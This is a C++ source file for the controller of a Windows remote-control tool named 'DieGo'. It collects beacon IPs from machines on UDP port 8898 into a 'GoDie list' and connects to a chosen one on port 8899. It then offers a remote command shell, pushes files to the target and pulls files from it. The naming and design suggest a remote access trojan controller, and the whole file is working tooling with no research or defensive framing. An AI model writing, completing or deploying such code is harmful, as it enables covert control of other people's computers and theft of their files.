#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <typeinfo>
#include <vector>
#define BUFFER 1024

using namespace std;

const char* CMD_EXIT="exit";
const char* CMD_CMD="cmd";
const char* CMD_QUIT="quit";
const char* CMD_SENDFILE="send";
const char* CMD_COPY="copy";
const char* OK="OK";

vector<string> all;
SOCKET s,tcp;
char buf[BUFFER];
int len;
int ret;
WSADATA data;
SOCKADDR_IN sin,tcpin;
bool chosing=true;
char FileBuf[1024];
void showAll() {
	system("cls");
	cout<<"Welcome to DieGo!\nMade By Xs.JIONG\n\nGoDie list:\n";
	for (int i=0;i<all.size();i++) cout<<(i+1)<<" - "<<all[i]<<endl;
	cout<<"Input the ip index to control:";
}
string ss;
HANDLE mFile;
unsigned long long FileSize;
char Recv[3];
void sendOK() {
	send(tcp,OK,strlen(OK),0);
}
void recvOK() {
	recv(tcp,Recv,3,0);
}
void recvFile() {
	system("cls");
	cout<<"Target Path:";
	string target,local;
	getchar();
	getline(cin,target);
	cout<<"Local Path:";
	getline(cin,local);
	send(tcp,CMD_COPY,strlen(CMD_COPY),0);
	recvOK();
	send(tcp,target.c_str(),target.length(),0);
	recvOK();
	DWORD FileLength;
	recv(tcp,(char*)&FileSize,sizeof(unsigned long long)+1,0);
	sendOK();
	mFile = CreateFile((LPSTR)(LPCTSTR) local.c_str(),GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
	unsigned long long al=0;
	do {
		FileLength=recv(tcp,FileBuf,sizeof(FileBuf),0);
		WriteFile(mFile,FileBuf,FileLength,&FileLength,NULL);
		al+=FileLength;
		if (FileLength!=0) cout<<al<<'/'<<FileSize<<endl;
	} while (FileSize-FileLength);
	CloseHandle(mFile);
	cout<<"Done!"<<endl;
	system("pause>nul");
}
void sendFile() {
	system("cls");
	string l,ll;
	cout<<"Local File:";
	getchar();
	getline(cin,l);
	cout<<"Target File:";
	getline(cin,ll);
	mFile = CreateFile((LPSTR)(LPCTSTR) l.c_str(),GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	FileSize=GetFileSize(mFile,NULL);
	send(tcp,CMD_SENDFILE,strlen(CMD_SENDFILE),0);
	recvOK();
	send(tcp,(char*)&FileSize,sizeof(unsigned long long)+1,0);
	recvOK();
	send(tcp,ll.c_str(),ll.length(),0);
	recvOK();
	DWORD readed;
	unsigned long long al=0;
	do {
		ReadFile(mFile,FileBuf,1024,&readed,NULL);
		send(tcp,FileBuf,readed,0);
		al+=readed;
		if (readed!=0) cout<<al<<'/'<<FileSize<<endl;
	} while (FileSize-al);
	CloseHandle(mFile);
	char s[3];
	recv(tcp,s,3,0);
	cout<<"Done!"<<endl;
	system("pause>nul");
}
DWORD WINAPI FindIp(LPVOID args) {
	while (chosing) {
		fill(buf,buf+strlen(buf),'\0');
		ret=recvfrom(s, buf, sizeof(buf), 0, (sockaddr*)&sin, &len);
		if (!chosing) return 0;
		if (ret>0) {
			buf[ret]='\0';
			ss=buf;
			bool find=false;
			for (int i=0;i<all.size();i++)
				if (all[i]==ss) {
					find=true;
					break;
				}
			if (!find) {
				all.push_back(ss);
				showAll();
			}
		}
	}
	return 0;
}
bool cmding=false;
const char* CGUI="Welcome to DieGo Control GUI!\nMade By Xs.JIONG\n\n1 - Cmd\n2 - Send File\n3 - Copy File\n4 - Exit\n5 - Quit\n\nChoose one:";
DWORD WINAPI ResultThread(LPVOID args) {
	char buffer[128];
	while (cmding) {
		fill(buffer,buffer+strlen(buffer),'\0');
		recv(tcp,buffer,128,0);
		if (strlen(buffer)==0) {
			cmding=false;
			return 0;
		}
		cout<<buffer;
	}
}
void cmdMode() {
	cmding=true;
	system("cls");
	send(tcp,CMD_CMD,strlen(CMD_CMD),0);
	char buff[5];
	recv(tcp,buff,5,0);
	string s;
	CreateThread(NULL, 0, ResultThread, NULL, 0, 0);
	char c;
	getchar();
	while (cmding) {
		s="";
		c=getchar();
		while (c!='\n') {
			s+=c;
			c=getchar();
		}
		if (s[0]==':'&&s[1]==':') {
			cmding=false;
			send(tcp,s.c_str(),s.length(),0);
			return;
		}
		if (s[0]=='e'&&s[1]=='x'&&s[2]=='i'&&s[3]=='t') {
			cmding=false;
			send(tcp,s.c_str(),s.length(),0);
			return;
		}
		if (s[0]=='c'&&s[1]=='l'&&s[2]=='s') system("cls");
		send(tcp,s.c_str(),s.length(),0);
	}
}
void doOne() {
	all.clear();
	chosing=true;
	system("cls");
	system("title DieGo");
	s = socket(AF_INET,SOCK_DGRAM,0);
	bool rr=true;
	setsockopt(s, SOL_SOCKET, SO_REUSEADDR, (char*)&rr, sizeof(BOOL));
	if (s==INVALID_SOCKET) {
		cout<<"Socket created failed, ErrorCode:"<<WSAGetLastError();
		WSACleanup();
		exit(1);
	}
	len=sizeof(SOCKADDR);
	ZeroMemory(buf,BUFFER);
	sin.sin_addr.S_un.S_addr = INADDR_ANY;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(8898);
	ret = bind(s,(SOCKADDR*)&sin,sizeof(SOCKADDR));
	if (ret==SOCKET_ERROR) {
		cout<<"Socket Error"<<endl;
		exit(1); 
	}
	showAll();
	CreateThread(NULL, 0, FindIp, NULL, 0, 0);
	int i;
	cin>>i;
	while (i>all.size()) {
		showAll();
		cin>>i;
	}
	i--;
	chosing=false;
	system("cls");
	cout<<"Connecting..."<<endl;
	closesocket(s);
	tcp=socket(AF_INET,SOCK_STREAM,0);
	tcpin.sin_addr.S_un.S_addr = inet_addr(all[i].c_str());
	tcpin.sin_family = AF_INET;
	tcpin.sin_port = htons(8899);
	connect(tcp,(SOCKADDR*)&tcpin,sizeof(SOCKADDR));
	system("cls");
	string s;
	char c;
	system(("title DieGo - "+string(all[i])).c_str());
	while (true) {
		system("cls");
		cout<<CGUI;
		cin>>i;
		while (i>5) {
			system("cls");
			cout<<CGUI;
			cin>>i;
		}
		switch (i) {
			case 1:{
				cmdMode();
				break;
			}
			case 2:{
				sendFile();
				break;
			}
			case 3:{
				recvFile();
				break;
			}
			case 4:{
				send(tcp,CMD_EXIT,strlen(CMD_EXIT),0);
				closesocket(tcp);
				return;
			}
			case 5:{
				send(tcp,CMD_QUIT,strlen(CMD_QUIT),0);
				closesocket(tcp);
				return;
			}
		}
	}
}
int main() {
	if (WSAStartup(MAKEWORD(2,2),&data)!=0) {
		cout<<"Start failed\n";
		exit(1);
	}
	while (true) doOne();
	return 0;
}
